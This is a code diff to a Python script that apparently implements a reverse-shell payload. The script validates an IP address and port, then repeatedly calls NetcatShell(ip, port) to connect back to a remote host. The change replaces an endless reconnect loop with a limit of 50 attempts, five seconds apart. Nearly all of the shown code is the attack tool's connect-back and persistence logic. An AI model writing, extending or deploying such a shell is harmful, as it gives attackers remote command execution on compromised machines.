@@ -12,6 +12,8 @@ import sys
 import pty
 import time
 
+MAX_ATTEMPTS = 50
+
 def checkIp(ip: str):
     try:
         socket.inet_aton(ip)
@@ -66,9 +68,11 @@ if __name__ == "__main__":
     if checkIp(ip) is True:
         if checkPort(port) is True:
             port = int(port)
-            while True:
+            attempts = 0
+            while attempts < MAX_ATTEMPTS:
                 Shell = NetcatShell(ip, port)
                 time.sleep(5)
+                attempts += 1
         else:
             error = "Invalid port for payload"
     else:
